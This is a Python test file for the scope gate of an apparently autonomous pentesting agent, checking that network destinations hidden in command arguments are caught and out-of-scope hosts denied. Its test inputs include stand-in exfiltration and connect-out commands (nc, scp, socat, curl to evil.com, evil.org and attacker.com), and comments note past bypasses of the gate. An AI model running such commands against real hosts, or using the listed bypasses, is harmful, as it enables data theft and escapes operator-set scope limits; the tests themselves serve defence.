"""Tests for per-tool extract_targets (audit-fix #11)."""

from __future__ import annotations

import pytest

from tools.ffuf_ import FfufDirBrute, FfufDirBruteInput
from tools.httpx_ import HttpxProbe, HttpxProbeInput
from tools.nmap_ import (
    NmapHostDiscovery,
    NmapHostDiscoveryInput,
    NmapServiceScan,
    NmapServiceScanInput,
)
from tools.nuclei_ import NucleiScan, NucleiScanInput
from tools.poc_exec import CuratedPoCExec, CuratedPoCExecInput
from tools.searchsploit_ import SearchsploitInput, SearchsploitLookup


def test_nmap_host_discovery_extracts_targets():
    t = NmapHostDiscovery()
    inp = NmapHostDiscoveryInput(targets=["10.0.0.0/24", "192.168.1.5"])
    assert sorted(t.extract_targets(inp)) == ["10.0.0.0/24", "192.168.1.5"]


def test_nmap_service_scan_extracts_targets():
    t = NmapServiceScan()
    inp = NmapServiceScanInput(targets=["10.0.0.5"])
    assert t.extract_targets(inp) == ["10.0.0.5"]


def test_httpx_extracts_targets():
    t = HttpxProbe()
    inp = HttpxProbeInput(targets=["10.0.0.5", "http://demo"])
    assert t.extract_targets(inp) == ["10.0.0.5", "http://demo"]


def test_nuclei_extracts_targets():
    t = NucleiScan()
    inp = NucleiScanInput(targets=["http://10.0.0.5"], tags=["cve"])
    assert t.extract_targets(inp) == ["http://10.0.0.5"]


def test_ffuf_extracts_targets():
    t = FfufDirBrute()
    inp = FfufDirBruteInput(url="http://10.0.0.5/")
    assert t.extract_targets(inp) == ["http://10.0.0.5/"]


def test_searchsploit_no_network_target():
    t = SearchsploitLookup()
    inp = SearchsploitInput(query="apache 2.4.49")
    assert t.extract_targets(inp) == []  # local lookup, no egress


def test_curated_poc_exec_extracts_target_host():
    t = CuratedPoCExec()
    inp = CuratedPoCExecInput(poc_id="DEMO-001", target_host="10.0.0.5", params={"x": 1})
    assert t.extract_targets(inp) == ["10.0.0.5"]


# --- sandbox-02 / sandboxN-02: operator_exec argv egress extraction ---


def _op_targets(argv, target="10.0.0.5"):
    from tools.operator_exec import OperatorExec, OperatorExecInput

    t = OperatorExec()
    inp = OperatorExecInput(
        argv=argv, target=target, justification="x" * 25
    )
    return t.extract_targets(inp)


def test_operator_exec_surfaces_url_in_argv():
    out = _op_targets(["curl", "http://out-of-scope.evil/x"])
    assert "http://out-of-scope.evil/x" in out


def test_operator_exec_surfaces_ip_in_argv():
    out = _op_targets(["nmap", "10.6.6.6"])
    assert "10.6.6.6" in out


def test_operator_exec_surfaces_bare_single_label_host_after_network_binary():
    # sandboxN-02 residual: ``nc internalhost 4444`` — the bare single-label
    # host must reach the scope gate.
    out = _op_targets(["nc", "internalhost", "4444"])
    assert "internalhost" in out


def test_operator_exec_surfaces_bare_host_for_ssh():
    out = _op_targets(["ssh", "box"])
    assert "box" in out


def test_operator_exec_surfaces_single_label_host_with_scheme():
    # ``curl http://wiki/`` — scheme present, single-label host (no dot).
    out = _op_targets(["curl", "http://wiki/"])
    assert "http://wiki/" in out


def test_operator_exec_port_is_not_a_host():
    # The numeric port after the host must not be surfaced as a target.
    out = _op_targets(["nc", "internalhost", "22"])
    assert "22" not in out


def test_operator_exec_non_network_binary_bare_word_not_surfaced():
    # ``echo hello`` — ``echo`` isn't a network binary, ``hello`` isn't a host.
    out = _op_targets(["echo", "hello"], target="10.0.0.5")
    assert out == ["10.0.0.5"]


def test_operator_exec_includes_declared_target():
    out = _op_targets(["nc", "internalhost", "4444"], target="10.0.0.5")
    assert "10.0.0.5" in out


# --- sandbox3-01 / sandbox3-02: flag-aware host extraction ---
# These pin down the EXACT cases from the round-3 review: the extractor must
# skip flag operands / subcommands / ports (sandbox3-01, was DENYING legit
# in-scope commands) AND must still find the real host behind value-flags or in
# ``user@host`` form (sandbox3-02, was BYPASSING the scope gate).


def test_curl_post_surfaces_only_url_host_not_verb():
    # sandbox3-01: ``-X POST`` operand must NOT be surfaced as a host.
    out = _op_targets(
        ["curl", "-X", "POST", "http://api.example.com/"], target="api.example.com"
    )
    assert "POST" not in out
    # The URL host is what the scope engine extracts; the URL token is surfaced.
    assert "http://api.example.com/" in out
    # No stray non-host tokens.
    for tok in out:
        assert tok in ("api.example.com", "http://api.example.com/")


def test_nmap_port_range_not_surfaced():
    # sandbox3-01: ``-p 1-65535`` operand must NOT be surfaced; only the host.
    out = _op_targets(["nmap", "-p", "1-65535", "10.0.0.5"], target="10.0.0.5")
    assert "1-65535" not in out
    assert "10.0.0.5" in out
    assert out == ["10.0.0.5"]


def test_ssh_value_flag_then_bare_host_surfaced():
    # sandbox3-02: ``ssh -p 2222 internalbox`` — host is behind a value-flag.
    out = _op_targets(["ssh", "-p", "2222", "internalbox"])
    assert "internalbox" in out
    assert "2222" not in out


def test_nc_value_flag_host_then_port():
    # sandbox3-02: ``nc -w 3 internalhost 4444`` — surface host, not flag value
    # or trailing port.
    out = _op_targets(["nc", "-w", "3", "internalhost", "4444"])
    assert "internalhost" in out
    assert "3" not in out
    assert "4444" not in out


def test_ssh_userinfo_host_surfaced():
    # sandbox3-02: ``ssh user@host`` — strip userinfo, surface the host.
    out = _op_targets(["ssh", "user@host"])
    assert "host" in out
    assert "user@host" not in out


def test_out_of_scope_nc_still_denied_end_to_end():
    # The scope gate must STILL deny a genuinely out-of-scope host (the fix must
    # not weaken enforcement). ``nc evil.com 4444`` → out_of_scope DENY.
    import time

    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    now_ns = int(time.time() * 1e9)
    eng = {
        "scope": {"cidrs": ["10.0.0.0/24"], "domains": ["example.com"]},
        "allowed_risk_classes": ["exploit"],
        "window": {"start_ns": now_ns - 10**12, "end_ns": now_ns + 10**12},
        "mode": "autonomous",
    }
    tool = {"risk_class": "exploit", "name": "operator_exec", "destructive": False}
    t = OperatorExec()
    inp = OperatorExecInput(
        argv=["nc", "evil.com", "4444"], target="10.0.0.5", justification="x" * 25
    )
    targets = t.extract_targets(inp)
    assert "evil.com" in targets
    res = evaluate(targets, eng, tool)
    assert res.allow is False
    assert res.reason == "out_of_scope"


def test_in_scope_flag_bearing_commands_allowed_end_to_end():
    # sandbox3-01 invariant: fully in-scope flag-bearing commands must be
    # ALLOWED (no false out-of-scope target from a flag operand / port range).
    import time

    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    now_ns = int(time.time() * 1e9)
    eng = {
        "scope": {"cidrs": ["10.0.0.0/24"], "domains": ["example.com"]},
        "allowed_risk_classes": ["exploit"],
        "window": {"start_ns": now_ns - 10**12, "end_ns": now_ns + 10**12},
        "mode": "autonomous",
    }
    tool = {"risk_class": "exploit", "name": "operator_exec", "destructive": False}
    t = OperatorExec()
    for argv, target in (
        (["curl", "-X", "POST", "http://api.example.com/"], "api.example.com"),
        (["nmap", "-p", "1-65535", "10.0.0.5"], "10.0.0.5"),
    ):
        inp = OperatorExecInput(argv=argv, target=target, justification="x" * 25)
        res = evaluate(t.extract_targets(inp), eng, tool)
        assert res.allow is True, (argv, res.reason)


# --- sandbox4-01..05: robust multi-host argv extraction ---
# Each fix is pinned to its EXACT review case. The philosophy: missing a real
# egress destination is a BYPASS (worse than over-blocking), so for known
# network binaries we surface ALL host-shaped destinations from argv — while
# never surfacing local file paths / flag values / verbs / numbers.


def _eng_inscope_example_com():
    import time

    now_ns = int(time.time() * 1e9)
    return {
        "scope": {"cidrs": ["10.0.0.0/24"], "domains": ["example.com"]},
        "allowed_risk_classes": ["exploit"],
        "window": {"start_ns": now_ns - 10**12, "end_ns": now_ns + 10**12},
        "mode": "autonomous",
    }


_OP_TOOL = {"risk_class": "exploit", "name": "operator_exec", "destructive": False}


def test_sandbox4_01_scp_remote_host_surfaced_local_file_not():
    # ``scp file user@evil.org:/p``: the egress host evil.org must be surfaced
    # (was a BYPASS — only the local file ``file`` was scope-checked), and the
    # local file ``file`` must NOT be surfaced (was also an over-block).
    out = _op_targets(["scp", "file", "user@evil.org:/p"], target="10.0.0.5")
    assert "evil.org" in out
    assert "file" not in out


def test_sandbox4_01_scp_out_of_scope_denied_end_to_end():
    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    inp = OperatorExecInput(
        argv=["scp", "file", "user@evil.org:/p"],
        target="10.0.0.5",
        justification="x" * 25,
    )
    targets = OperatorExec().extract_targets(inp)
    assert "evil.org" in targets
    res = evaluate(targets, _eng_inscope_example_com(), _OP_TOOL)
    assert res.allow is False
    assert res.reason == "out_of_scope"


def test_sandbox4_01_scp_in_scope_allowed_end_to_end():
    # In-scope transfer must be ALLOWED — and the local file ``file`` must not
    # be (mis-)scope-checked as a host (over-block regression).
    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    inp = OperatorExecInput(
        argv=["scp", "file", "user@api.example.com:/p"],
        target="api.example.com",
        justification="x" * 25,
    )
    targets = OperatorExec().extract_targets(inp)
    assert "api.example.com" in targets
    assert "file" not in targets
    res = evaluate(targets, _eng_inscope_example_com(), _OP_TOOL)
    assert res.allow is True, res.reason


def test_sandbox4_02_socat_addr_spec_host_surfaced_and_denied():
    # ``socat - TCP:evil.org:80``: the host inside the address spec must be
    # surfaced (was a total BYPASS) and an out-of-scope host DENIED.
    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    out = _op_targets(["socat", "-", "TCP:evil.org:80"], target="10.0.0.5")
    assert "evil.org" in out

    inp = OperatorExecInput(
        argv=["socat", "-", "TCP:evil.org:80"],
        target="10.0.0.5",
        justification="x" * 25,
    )
    targets = OperatorExec().extract_targets(inp)
    res = evaluate(targets, _eng_inscope_example_com(), _OP_TOOL)
    assert res.allow is False
    assert res.reason == "out_of_scope"


def test_sandbox4_03_nmap_multi_target_both_surfaced():
    # ``nmap box1 box2``: BOTH single-label targets must be surfaced (was only
    # the first — the second was scanned un-checked).
    out = _op_targets(["nmap", "box1", "box2"], target="10.0.0.5")
    assert "box1" in out
    assert "box2" in out


def test_sandbox4_04_nmap_input_list_file_not_surfaced():
    # ``nmap -iL targets.txt``: ``-iL`` is a value-flag whose value is a FILE,
    # not a host — it must NOT be surfaced (was an over-block).
    out = _op_targets(["nmap", "-iL", "targets.txt", "-p", "80"], target="10.0.0.5")
    assert "targets.txt" not in out
    # Only the declared target remains (no false argv host).
    assert out == ["10.0.0.5"]


def test_sandbox4_05_underscore_service_name_accepted():
    # ``nc db_server 4444``: underscore service names (Docker/SMB/NetBIOS) must
    # be accepted as hosts so they reach the scope gate.
    from tools.operator_exec import _is_host_shaped

    assert _is_host_shaped("db_server") is True
    out = _op_targets(["nc", "db_server", "4444"], target="10.0.0.5")
    assert "db_server" in out


def test_sandbox3_01_non_regression_only_real_host_surfaced():
    # Re-confirm the sandbox3-01 invariant after the sandbox4 changes: the
    # value-flag/verb/number guards still surface ONLY the real host.
    out = _op_targets(["curl", "-X", "POST", "http://api.example.com/"], target="api.example.com")
    assert "POST" not in out
    for tok in out:
        assert tok in ("api.example.com", "http://api.example.com/")

    out2 = _op_targets(["nmap", "-p", "1-65535", "10.0.0.5"], target="10.0.0.5")
    assert out2 == ["10.0.0.5"]


def test_sandbox3_01_non_regression_allowed_end_to_end():
    from policy.scope import evaluate
    from tools.operator_exec import OperatorExec, OperatorExecInput

    eng = _eng_inscope_example_com()
    t = OperatorExec()
    for argv, target in (
        (["curl", "-X", "POST", "http://api.example.com/"], "api.example.com"),
        (["nmap", "-p", "1-65535", "10.0.0.5"], "10.0.0.5"),
    ):
        inp = OperatorExecInput(argv=argv, target=target, justification="x" * 25)
        res = evaluate(t.extract_targets(inp), eng, _OP_TOOL)
        assert res.allow is True, (argv, res.reason)


def test_default_raises_so_new_tool_authors_notice():
    """A tool that forgets to implement extract_targets must raise loudly."""
    from tools.base import Tool

    class _NewTool(Tool):  # type: ignore[type-arg]
        name = "_test_new_tool"
        description = "x"
        from worldstate.schema import RiskClass, Stage

        stage = Stage.RECON
        risk_class = RiskClass.RECON
        from pydantic import BaseModel

        class Input(BaseModel):
            secret_egress_url: str

        Output = Input

        async def run(self, input, ctx):  # type: ignore[no-untyped-def]
            raise NotImplementedError

        # R3 #I1 Bug 7: summarize_for_model is now @abstractmethod so a
        # Tool subclass that doesn't override it cannot be instantiated.
        # This test still wants to exercise the extract_targets default,
        # so we provide a trivial summarizer here. The
        # ``test_subclass_without_summarize_for_model_cannot_instantiate``
        # test in test_summarize_for_model_required.py covers the inverse.
        def summarize_for_model(self, output, *, tool_run_id, persisted):  # type: ignore[no-untyped-def]
            return f"new_tool persisted={persisted}"

    t = _NewTool()
    with pytest.raises(NotImplementedError, match="extract_targets must be implemented"):
        t.extract_targets(t.Input(secret_egress_url="http://attacker.com"))
